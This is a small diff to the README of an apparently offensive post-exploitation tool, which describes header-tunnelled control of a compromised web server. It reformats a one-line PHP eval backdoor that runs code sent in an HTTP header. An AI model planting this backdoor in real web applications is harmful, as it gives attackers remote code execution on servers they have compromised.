@@ -13,9 +13,8 @@ compromised web server for **privilege escalation** purposes.
 The obfuscated communication is accomplished using HTTP headers under
 valid client HTTP requests and web server's responses, tunneled through
 a tiny **polymorphic backdoor**:
-```php
-<? @eval($_SERVER['HTTP_PHPSPL01T']) ?>
-```
+
+    <? @eval($_SERVER['HTTP_PHPSPL01T']) ?>
 
 ---------------------------------------------------------------------
 #### Features ####
